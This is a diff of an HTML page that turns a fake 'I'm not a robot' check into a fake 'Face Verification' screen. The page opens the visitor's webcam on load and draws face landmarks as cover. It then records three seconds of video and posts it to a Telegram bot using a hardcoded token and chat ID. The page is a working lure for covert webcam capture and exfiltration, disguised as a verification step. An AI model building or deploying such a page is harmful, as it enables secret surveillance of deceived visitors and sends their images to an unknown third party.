@@ -3,195 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robot Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>Face Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
     <style>
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
-            padding: 0;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(135deg, #74ebd5, #acb6e5);
-            animation: backgroundAnimation 10s ease infinite alternate;
-        }
-
-        @keyframes backgroundAnimation {
-            0% {
-                background: linear-gradient(135deg, #74ebd5, #acb6e5);
-            }
-            100% {
-                background: linear-gradient(135deg, #acb6e5, #74ebd5);
-            }
+            background: linear-gradient(135deg, #283593, #1565C0);
+            color: white;
         }
 
         .container {
             text-align: center;
-            background-color: rgba(255, 255, 255, 0.9);
-            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.8);
             padding: 40px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-            position: relative; /* Position relative for absolute children */
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
 
         h1 {
-            font-size: 2.5em;
+            font-size: 24px;
             margin-bottom: 20px;
-            color: #4CAF50; /* Green color for the title */
         }
 
-        #checkbox-container {
-            margin-top: 20px;
+        #video {
+            width: 320px;
+            height: 240px;
+            border-radius: 20px;
+            border: 2px solid #4CAF50;
+            margin: 20px auto;
+            display: block;
+            object-fit: cover;
         }
 
-        label {
-            font-size: 1.2em;
-        }
-
-        input[type="checkbox"] {
-            margin-right: 10px;
-            transform: scale(1.5);
-        }
-
-        video {
-            display: none; /* Hide video element */
-        }
-
-        .face-indicator {
+        #overlay {
             position: absolute;
             top: 50%;
             left: 50%;
-            width: 100px; /* Size of the indicator */
-            height: 100px; /* Size of the indicator */
-            border-radius: 50%;
-            border: 4px solid rgba(76, 175, 80, 0.8); /* Green border */
+            width: 320px;
+            height: 240px;
             transform: translate(-50%, -50%);
-            animation: pulse-animation 1s infinite; /* Pulsing effect */
-            display: none; /* Initially hidden */
+            pointer-events: none;
         }
 
-        @keyframes pulse-animation {
-            0% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.1); }
-            100% { transform: translate(-50%, -50%) scale(1); }
-        }
-
-        #loading, #success {
-            font-size: 1.2em;
-            color: #4CAF50; /* Green color for messages */
-            margin-top: 20px;
-        }
-
-        #loading {
+        .loading {
+            font-size: 16px;
+            color: #FFC107;
+            margin: 20px 0;
             display: none;
         }
 
-        #success {
+        .success {
+            font-size: 18px;
+            color: #4CAF50;
             display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Are you a Robot?</h1>
-        <div id="checkbox-container">
-            <label>
-                <input type="checkbox" id="robot-checkbox"> I'm not a robot
-            </label>
-        </div>
-        
-        <!-- Face Indicator -->
-        <div class="face-indicator" id="face-indicator"></div>
-
+        <h1>Face Verification</h1>
         <video id="video" autoplay playsinline muted></video>
-        
-        <div id="loading">Recording... Please wait</div>
-        <div id="success">✅ Verification Complete!</div>
+        <canvas id="overlay"></canvas>
+        <div class="loading">Processing your face...</div>
+        <div class="success">✅ Verified Successfully!</div>
     </div>
 
     <script>
         const video = document.getElementById('video');
-        const checkbox = document.getElementById('robot-checkbox');
-        const loading = document.getElementById('loading');
-        const success = document.getElementById('success');
-        const faceIndicator = document.getElementById('face-indicator');
+        const overlay = document.getElementById('overlay');
+        const loading = document.querySelector('.loading');
+        const success = document.querySelector('.success');
+        const canvasCtx = overlay.getContext('2d');
+        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
+        const telegramChatId = "2070423407";
 
-        // Telegram API credentials (keep these secure in production)
-        const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
-        const telegramChatId = "YOUR_CHAT_ID";
+        async function setupFaceVerification() {
+            // Load face-api models
+            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');
+            await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');
 
-        checkbox.addEventListener('change', (e) => {
-            if (e.target.checked) {
-                loading.style.display = 'block';
-                faceIndicator.style.display = 'block'; // Show face indicator
+            // Request camera access
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
 
-                navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15 } }
-                }).then((stream) => {
-                    video.srcObject = stream;
+            // Start face tracking
+            video.addEventListener('play', () => {
+                overlay.width = video.videoWidth;
+                overlay.height = video.videoHeight;
 
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
+                const interval = setInterval(async () => {
+                    const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
 
-                    mediaRecorder.start();
+                    if (detections) {
+                        canvasCtx.clearRect(0, 0, overlay.width, overlay.height);
+                        const resizedDetections = faceapi.resizeResults(detections, { width: overlay.width, height: overlay.height });
+                        
+                        // Draw face box
+                        const box = resizedDetections.detection.box;
+                        canvasCtx.strokeStyle = '#4CAF50';
+                        canvasCtx.lineWidth = 2;
+                        canvasCtx.strokeRect(box.x, box.y, box.width, box.height);
 
-                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
-
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 3000); // Record for only 3 seconds
-
-                    mediaRecorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
-                        formData.append('chat_id', telegramChatId);
-                        formData.append('video', blob, 'video.webm');
-
-                        fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then((response) => {
-                            if (response.ok) {
-                                success.style.display = 'block';
-                                setTimeout(() => {
-                                    loading.style.display = 'none';
-                                    success.style.display = 'none';
-                                    alert('Verification complete!');
-                                }, 2000);
-                            } else {
-                                alert('Failed to send video.');
-                            }
-                        })
-                        .catch((error) => {
-                            alert('Error: ' + error.message);
+                        // Draw landmarks
+                        const landmarks = resizedDetections.landmarks;
+                        canvasCtx.fillStyle = '#FFC107';
+                        landmarks.positions.forEach((pos) => {
+                            canvasCtx.beginPath();
+                            canvasCtx.arc(pos.x, pos.y, 2, 0, 2 * Math.PI);
+                            canvasCtx.fill();
                         });
 
-                        stream.getTracks().forEach(track => track.stop());
-                        faceIndicator.style.display = 'none'; // Hide face indicator after recording
-                    };
-                }).catch((err) => {
-                    alert("Unable to access camera: " + err.message);
-                });
-                
-                // Simulate face tracking (for demonstration purposes)
-                let interval = setInterval(() => {
-                    if (faceIndicator.style.display === 'block') {
-                        const xPos = Math.random() * (window.innerWidth - 100); // Random x position
-                        const yPos = Math.random() * (window.innerHeight - 100); // Random y position
-                        faceIndicator.style.transform = `translate(${xPos}px, ${yPos}px)`; // Move indicator
+                        // Stop recording after 3 seconds
+                        setTimeout(() => {
+                            clearInterval(interval);
+                            sendVideoToTelegram(stream);
+                        }, 3000);
                     }
-                }, 500);
+                }, 100);
+            });
+        }
 
-                // Stop moving the indicator when recording stops
-                mediaRecorder.onstop = () => clearInterval(interval);
-                
-                // Stop moving the indicator when checkbox is unchecked
-                checkbox.addEventListener('change', () => clearInterval(interval));
-                
-            }
+        async function sendVideoToTelegram(stream) {
+            loading.style.display = 'block';
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.start();
+
+            mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', telegramChatId);
+                formData.append('video', blob, 'video.webm');
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then((response) => {
+                    loading.style.display = 'none';
+                    success.style.display = 'block';
+
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch((error) => {
+                    alert('Error: ' + error.message);
+                });
+            };
+
+            setTimeout(() => mediaRecorder.stop(), 3000); // Stop after 3 seconds
+        }
+
+        setupFaceVerification().catch((error) => {
+            alert('Error: Unable to access camera: ' + error.message);
         });
     </script>
 </body>
